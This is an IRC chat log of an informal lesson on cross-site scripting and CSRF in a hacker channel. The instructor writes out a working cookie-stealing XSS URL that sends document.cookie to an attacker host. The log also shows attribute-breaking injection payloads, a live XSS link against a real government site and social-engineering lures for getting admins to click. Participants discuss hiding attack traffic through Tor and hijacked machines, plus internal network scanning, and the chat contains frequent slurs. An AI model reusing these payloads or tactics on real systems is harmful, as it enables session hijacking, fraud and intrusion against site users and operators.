XSS and CSRF (by xochipilli)

<xochipilli>	WEL
<xochipilli>	WHO WANTS TO GET LEARNED
<xochipilli>	ON SS
<xochipilli>	XSS*
<pizzaman>	I DO
<Rode0s>	me
<Theruler>	9 of them were prolly feds
<xochipilli>	^
<p00pi3>	we got a site?
<pizzaman>	tell me how 2 goatse ppl.
*	selketraz has quit (Ping timeout)
<p00pi3>	persistant xss is the tits.
<pizzaman>	yeh
<xochipilli>	ok
<xochipilli>	so
<xochipilli>	p00pi3: 
<xochipilli>	despite outing me as a drug dealer
<xochipilli>	jus answered my first question
<xochipilli>	does anyone know
<xochipilli>	the different kinds of XSS?
<pizzaman>	no, and i dont care because i use what'll work
<qwert>	derp
<xochipilli>	bonus points if u can explain why each is useful
<qwert>	Fox: i will cam with you
*	In4TehLulz (In4TehLulz@black.hat.academy.1337) has joined #school
<xochipilli>	qwert: THATS OVER
<xochipilli>	PAY ATTN
<qwert>	:'(
<xochipilli>	01:01 <@xochipilli> does anyone know                 
<xochipilli>	01:01 <@xochipilli> the different kinds of XSS?      
<xochipilli>	^^^^^^^^
<pizzaman>	different kinds: xss for lulz. xss for moralfaggotry. xss for profit.
*	d1zzY (d1zzY@Hack.The.Planet) has joined #school
<pizzaman>	oh, and xss for lame.
<xochipilli>	those are different kinds
<xochipilli>	but
<xochipilli>	not what i was lookoin for
<xochipilli>	p00pi3: 
<prophet>	persistent XSS is when you can inject something into the page and it will remain for other viewers
<xochipilli>	u know
<xochipilli>	SPIT IT OUT
<prophet>	as in
<xochipilli>	ok
<prophet>	a forum, or guestbook or similar
<xochipilli>	so
<xochipilli>	what is
<xochipilli>	non-persistent
<xochipilli>	XSS?
<In4TehLulz>	non-persistent?
<qwert>	usually
<xochipilli>	yes
<qwert>	through the URL
<xochipilli>	its not stored in a DB
<qwert>	or other injection media that you have to inject the code you want
<xochipilli>	its a get param
<qwert>	everytime
<xochipilli>	or something like that
<xochipilli>	something NON-PERSISTENT
<xochipilli>	now
<prophet>	a situation like say, a search query where it is vulnerable to XSS when searched in such a way, or a url param, etc
<qwert>	just because its persistent dont mean its in a db nigger
<xochipilli>	how are each these useful?
<xochipilli>	qwert: JUST AN EXAMPLE
<xochipilli>	jebus
<xochipilli>	its STORED 
<xochipilli>	persistently
<xochipilli>	is the point
<xochipilli>	forum post is a good example
<xochipilli>	so i guess before i get into it more
<xochipilli>	ill explain basically what an XSS vuln is
<xochipilli>	XSS = Cross Site Scripting
*	smeagol (bgp@my.precious) has joined #school
<xochipilli>	what this means is, you can inject html/javascript/client-side code
<xochipilli>	into a webpage
<xochipilli>	this can either be persistent
<xochipilli>	like a forum post
<xochipilli>	where every user who sees the post will load your injected code
<xochipilli>	or it can be injected through a get param
<xochipilli>	or another non-persistent parameter
<xochipilli>	tho its usually get
<xochipilli>	now, how is this useful?
<xochipilli>	theyre both useful in different ways
<xochipilli>	a persistent injection could be used to say
<xochipilli>	iframe an attack page in the backgorund of a site
<xochipilli>	so u get traffic on your attack page
<xochipilli>	the applications of a persistent vuln are more obvious
<xochipilli>	now, how would one use a non-persistent XSS?
<xochipilli>	lets say theres a site
*	TT0T has quit (Input/output error)
<xochipilli>	http://example.com/viewlisting.php?category="><b>this is my injection</b>
<xochipilli>	how is that useful to an attacker?
<xochipilli>	pizzaman: you said u do whats useful, any input?
<qwert>	leveraging it for an csrf
<qwert>	or social engineering
<toxology>	get cookies?
<xochipilli>	all of those are good answers
<xochipilli>	ill get to CSRF later, qwert 
<xochipilli>	very good answer ;)
<pizzaman>	yeah, xss trough sqli, i could tell you a story about it but that'd reveal who i am lulz.
*	Fox sets mode +m #school
<Fox>	faggots.
<xochipilli>	what i was looking for get cookies
<xochipilli>	since thats the simplest application of a non-persistent
<xochipilli>	or persistent XSS attack
<xochipilli>	basically, many sites will store login information in a cookie
<xochipilli>	meaning, everything that makes 'xochipilli' who he is on men4menforumz.net
<xochipilli>	is stored in a cookie
<xochipilli>	so, if someone were to steal the contents of that cookie, the too
<xochipilli>	could be xochipilli
<xochipilli>	and reveal my dirty, men4men secrets to the world
<xochipilli>	so, lets look at the example i mentioned
<xochipilli>	http://example.com/viewlisting.php?category="><b>this is my injection</b> 
<xochipilli>	that injects a nice little bold message
*	Fox gives voice to _0xE9
<xochipilli>	now i wanna use this to jack another users, or an admins login to the site
<xochipilli>	rather, their session
*	solidsnake (4a3c9b01@ec-4442AFE.mibbit.com) has joined #school
<xochipilli>	id setup a script to accept their cookie, and then hijkack their session
<xochipilli>	or jus store the cookie
<xochipilli>	but u gotta act quick, it wont stay good forever
<xochipilli>	so if u can automate an attack using the stolen cookies, thats best
<xochipilli>	this script, is called a 'cookie stealer'
<xochipilli>	so you would essentially use the injection to compromise information you couldnt otherwise
<xochipilli>	their cookie
<xochipilli>	since their browser will only allow that domain to access that information
<xochipilli>	this is the crux of an XSS attack
<xochipilli>	> their browser will only allow that domain to access that information 
<xochipilli>	so youd do sometihng like
<xochipilli>	http://example.com/viewlisting.php?category="><script>document.location='http://yoururl/stealer.cgi?c=
<xochipilli>	http://example.com/viewlisting.php?category="><script>document.location='http://yoururl/stealer.cgi?c='+document.cookie
<xochipilli>	http://example.com/viewlisting.php?category="><script>document.location='http://yoururl/stealer.cgi?c='+document.cookie</script>
<xochipilli>	simplest XSS based attack
<xochipilli>	any questions?
*	xochipilli sets mode -m #school
<_0xE9>	Simple enough
<xochipilli>	yeah
<xochipilli>	takes a little SE
<xochipilli>	send the admin that link
<_0xE9>	I've never found and persistent xxs
<xochipilli>	'I found a bug in your site, the category doesnt exist? can u fix it?'
<xochipilli>	or something
<xochipilli>	well
<xochipilli>	im gunna come back to persistent XSS now
<xochipilli>	most obvious use a persistent XSS, imo
<xochipilli>	is iframing an attack page
<qwert>	a simple SE would be
<xochipilli>	to deploy malware
<qwert>	send them a link that iframes a form
<xochipilli>	people write bots to fuzz XSS
<qwert>	or writes out a form to the page
<xochipilli>	for this purpose
<Theruler>	remember href is your friend because most ppl dnt look at the botom of there browser to see the actuall link they are clicking on
<xochipilli>	spam the web w/ XSS strings to iframe their exploit page
<qwert>	then mass mail it as "password reset" / whatever u want
<xochipilli>	^
<xochipilli>	you can get creative w/ the SE
<xochipilli>	but point is
<xochipilli>	this attack pretty much requires some amount of SE
<xochipilli>	so now, thats the most  based application of XSS
<xochipilli>	the bigger risk, w/ XSS
<xochipilli>	imo
<xochipilli>	is in combination w/ a CSRF attack
<xochipilli>	aka XSRF
<xochipilli>	qwert: you meantioned this
<xochipilli>	for those who dont know
*	CuteLostDragon has quit (Quit: Leaving)
*	xochipilli gives voice to pizzaman
<pizzaman>	https://extranet.tsa.dhs.gov/elmsgold/user/authenticate.do?userName=%3C/script%3E%3Cscript%3Ealert%28%27penis%27%29%3C/script%3E
<xochipilli>	its not +m
<xochipilli>	lol
<pizzaman>	whoops, i did not mean that.
<pizzaman>	lulz.
<xochipilli>	there is an example
<xochipilli>	of an XSS attack
<xochipilli>	in the wild
<xochipilli>	now
<xochipilli>	the real risk is in combation w/ a Cross Site Request Forgery
<xochipilli>	qwert: you mentioned this early, would you like to explain to everyon eelse what that means?
<xochipilli>	ealier*
<xochipilli>	i gotta piss brb
<xochipilli>	kback
<xochipilli>	so
<xochipilli>	CSRF
<pizzaman>	Oh, can i give you guys a heads up? You can use a few simple regexes in foxyproxy to automagically torify or proxy any xss lfi or sql attempts. just so you dont get caught.
<pizzaman>	like when your hacking drunk
<xochipilli>	you should just vpn all your traffic, for privacy concerns
<xochipilli>	ofc
<Theruler>	^
<xochipilli>	socks proxies on donated boxes
<xochipilli>	work as well
<xochipilli>	or a friends box
<xochipilli>	u know
<xochipilli>	whatever
<xochipilli>	NYB <<< not your box
<xochipilli>	so, lets say
<xochipilli>	im on an e-gold site
<xochipilli>	and they have a script, to send 5 e-golds to my bro, Theruler 
<xochipilli>	http://bestegoldever.com/send.php?username=Theruler&amount=5
<xochipilli>	does anyone see the problem w/ this?
<pizzaman>	yeah
<prophet>	You can be forced to it
<xochipilli>	^
<pizzaman>	if theruler works at the department of homeland security
<xochipilli>	precisely
<xochipilli>	now
<xochipilli>	if you were an admin
<pizzaman>	you can make him visit the login page & give you jew gold.
<xochipilli>	how would u stop that?
<xochipilli>	say you wrote that page
<pizzaman>	regexes.
<xochipilli>	how would u stop someone from forcing that
<xochipilli>	pizzaman: explain
<prophet>	use a nonce
<pizzaman>	regexes on the DHS side.
<xochipilli>	nonce?
<xochipilli>	we're talking about bestegoldever.com now
<pizzaman>	oh.
<Rode0s>	cleaning cookies?
<prophet>	yeah, a one-time generated token, that if not valid it wont process
<pizzaman>	requiring a confirmation  + login ofc.
<xochipilli>	well
<xochipilli>	heres the thing
<xochipilli>	lets say
<xochipilli>	youre logged onto bestegold ever
<xochipilli>	and visit a website /w that iframed
<xochipilli>	your cookie is still stored
<xochipilli>	so the query is executed in ful, and you give Theruler 5 e-golds
<xochipilli>	follow?
<pizzaman>	not what im saying.
<xochipilli>	whatre you sayin?
<pizzaman>	require the user to authenticate before the transfer takes place, regardless of cookies.
<xochipilli>	ah
<xochipilli>	yes
<xochipilli>	that is one solution
<xochipilli>	thats probably the best way btqh
<xochipilli>	but, its inconvenient and unintuitive to the user
<xochipilli>	and most people will not implement that
<xochipilli>	since convience is more important than security ;)
<Theruler>	bussiness do not like to piss people off reguardless how sescure they tell ppl it is
<xochipilli>	so, imagine youre a shittier developer than you are
<xochipilli>	how would u do it?
<Theruler>	people are lazy
<pizzaman>	captchas!
<pizzaman>	:P
<xochipilli>	haha
<xochipilli>	no
<xochipilli>	well
<xochipilli>	yes
<neth0les>	post?
<xochipilli>	but again
<xochipilli>	neth0les: ill come back to that
<xochipilli>	that doesn tsave u
<xochipilli>	lol
<neth0les>	i know. you said shitty dev :)
<xochipilli>	ah
<xochipilli>	hehe
<xochipilli>	so
<xochipilli>	lets start w/ that
<xochipilli>	neth0les writes his script ot use post
<xochipilli>	instead of GET
<xochipilli>	so, an attack could get clever
<xochipilli>	whats to stop them from simply writing a form that submits to your script
<xochipilli>	you could even automate it w/ some js magic
*	Fox has quit (Ping timeout)
*	Fox (Fox@E6870148.1276228B.BD5AC284.IP) has joined #school
<xochipilli>	so, what else coul you do?
<xochipilli>	as a shitty, underpaid, lazy admin
<Fox>	PACKET EVERYTHING.
<eax>	rawr
<prophet>	referer checking? :-P
<xochipilli>	^^^^^^
<xochipilli>	thank you prophet 
<eax>	PACKET IT ALL
<xochipilli>	thats what i was lookin for
<prophet>	hehe i figured
*	Theruler sets mode +q #school Fox
*	Theruler gives channel operator status to eax
<xochipilli>	still, not the best solution, referrers can be spoofed
<xochipilli>	some pages get clever, will generate a key an embed it in the form, look for it
<xochipilli>	almost like a captcha
<xochipilli>	something to note LOTS OF ASP PAGES ARE VULN TO CSRF
<xochipilli>	but the specifics of that are another story
<xochipilli>	so
<xochipilli>	can anyone see how an XSS and CSRF attack might be combined?
<pizzaman>	csrf to the xss'd url (assuming GET).

<xochipilli>	^
<xochipilli>	any other ideas?
<Fox>	WHAT YOU GRIP GRIP? NICCA TEC TEC
<xochipilli>	perhaps use the XSS to execute a CSRF attack from their domain?
*	_0xE9 has quit (Input/output error)
<xochipilli>	or a specific page on their odmain
<xochipilli>	to 'spoof' the reffer?

<pizzaman>	btw: xss can be used to scan networks.
<xochipilli>	referrer*
<pizzaman>	So in case you ever need a map of a company's internal network, that's how;)
<xochipilli>	XSS is a very veretile attack
<xochipilli>	you just have to be smart about it
<xochipilli>	its not the easiest
<xochipilli>	but its extremely useful
<xochipilli>	any questions?
<xochipilli>	SHE FROM SOUTH CENTRALL
<pizzaman>	Yeah: practical examples/links to papers.
<Fox>	IMA RAPPER
<xochipilli>	pizzaman: you provided a live example :p
<xochipilli>	ive given a few examples
*	shatter (brandon@ec-ABC38EC2.new.res.rr.com) has joined #school
<prophet>	http://ha.ckers.org/xss.html
<prophet>	common xss filter evasions
<xochipilli>	well
<pizzaman>	propeth: that
<xochipilli>	ill get into some specific attacks
<xochipilli>	ok so
<xochipilli>	non-persistent XSS
<Fox>	straight got my ass beat, but i still hit them ass cheeks
<xochipilli>	basically, a GET param is gettin injected into html
<xochipilli>	the key is WHERE
<xochipilli>	in the html
<xochipilli>	i find the ones that are most often overlooked
<xochipilli>	are those that dont necessarily requires brackets
<Fox>	I GOT TIP COVERED. THANK YOU.
<xochipilli>	for examples
<xochipilli>	lets say
<xochipilli>	a link from a GET param
<xochipilli>	gets inject
<pizzaman>	Fox: i'm not a rapper, i'm a raper
<xochipilli>	<a href="[INJECTED LINK]">View your account</a>
<xochipilli>	now, lets say the link is
<Fox>	I need to not be able to talk.
*	Fox sets mode -q #school Fox
<Fox>	talk
<Fox>	fuck.
<xochipilli>	http://example.com/" onmouseover="EVILJAVASCRIPT
<xochipilli>	when they mouse over the link, BAM
<xochipilli>	injected JS
<Fox>	bang
<xochipilli>	the admin thinks theyre bein smart, filtering <>
<pizzaman>	Try onLoad too :)
<xochipilli>	but they dont filter double/single quotes
<xochipilli>	OWNED
<xochipilli>	yeah
<xochipilli>	depends on the tag
<xochipilli>	not all tags support various js events
<xochipilli>	u can look up what supports what
<xochipilli>	onSelect
<xochipilli>	for input tags
<xochipilli>	etc
<xochipilli>	thats my fav XSS attack, injecting into a tag like that
<pizzaman>	perhaps you might even change it's size as to make it easier to mouse over;)
<xochipilli>	heh
<xochipilli>	well, if its a link
<xochipilli>	may not be necessary
<xochipilli>	depends on the tag
<xochipilli>	like i sa,d you can rly get creative
<xochipilli>	w/ these things
<xochipilli>	tho props pizzaman, you know whats up ;)
<xochipilli>	so thats rly all there is to it
<xochipilli>	thers a million and a half ways to do an XSS
<xochipilli>	go out there
<xochipilli>	get creative
<xochipilli>	<3
<xochipilli>	any quetions?
<xochipilli>	questions*
<xochipilli>	also, more eamples
<pizzaman>	How exactly do i get root using this?;)
<xochipilli>	if your param is injected into a <script> block
<pizzaman>	Sorry, im drunk.
<xochipilli>	; yourjs;
<xochipilli>	or
<xochipilli>	';your js;
<xochipilli>	etc
<xochipilli>	you know, jus see hwere its gettin injected and decide what u wanna inject
<pizzaman>	In fact, this is the case for the live example given.
<xochipilli>	^
<pizzaman>	I was just too lazy to add a ; and broke the script tag;)
<xochipilli>	well
<xochipilli>	thers no direct way
<xochipilli>	to get root
<xochipilli>	thats why i said its one of the harder attacks to rly exploit
<xochipilli>	but trust me
<xochipilli>	if you get smart w/ it
<xochipilli>	youll get in in a big way
<xochipilli>	serve up an attack page, gain axx to internal boxes, SE the admin for an account etc
<xochipilli>	its a simple but very versetile attack
<xochipilli>	its not like LFI/RFI, SQLi etc in that it doesnt ive u direct ax to the box, u gotta leverage it
<xochipilli>	to get info/access
<xochipilli>	thats what makes it so dangerous
<pizzaman>	http://www.businessinfo.co.uk/labs/lan_scan/lan_scan.php javascript port scan.
<xochipilli>	and why XSS and CSRF are considered HIGH RISK vulns
<pizzaman>	xochipilli: mind if i join in?
<xochipilli>	go for it
<pizzaman>	Javascript can be used to tunnel one port to the external interent trough a firewall.
<pizzaman>	Say you connect to the local internet on a certain port, like the router's control panel, and on the other end to a specific server port the attacker set.
<toxology>	thanks for the talk xochipilli :D
<elizabeth>	interesting
<pizzaman>	You now effectively worked around their firewall, and connected to their internal network trough XSS.
*	xochipilli gives channel half-operator status to pizzaman
<pizzaman>	This works as long as the page is open, so you best test your shit and know their architecture.
<xochipilli>	u can also collect client info
<xochipilli>	to gain info about their network
<pizzaman>	Since javascript allows you to inject java/flash, see if they have these installed.
<pizzaman>	It's p. easy to drop a shell with java tbh.
<xochipilli>	as i mentioned
<xochipilli>	u can straight drop an attack page
<xochipilli>	if the page is used internationally, you can use that as a route to infect internal boxes
<xochipilli>	and gain axx to their network
<Fox>	Xo
<Fox>	you mind if I interject?
